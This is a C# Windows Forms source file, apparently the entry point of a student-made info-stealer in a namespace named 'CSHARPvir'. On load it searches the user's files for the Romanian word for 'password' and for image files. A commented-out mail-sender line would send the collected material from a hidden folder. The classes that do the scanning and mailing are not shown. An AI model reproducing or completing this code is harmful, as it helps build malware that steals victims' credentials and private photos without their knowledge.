using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CSHARPvir
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }



        private void Form1_Load(object sender, EventArgs e)
        {
         // functie pentru a schimba directorul,by default programul cauta pe dektop
         //   pathfinder.Instance.Work();

            //searching for files with a specific key
            TextScan t = new TextScan("parola");
            t.work();
            //searching for files with a specific format
            PhotoScan ps = new PhotoScan(".png.jpg.jpeg");
            ps.work();


            MessageBox.Show("u redy?");

          // Mail sender:
          //  MailSender.Instance.send(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "/vir");
        }
    }
}
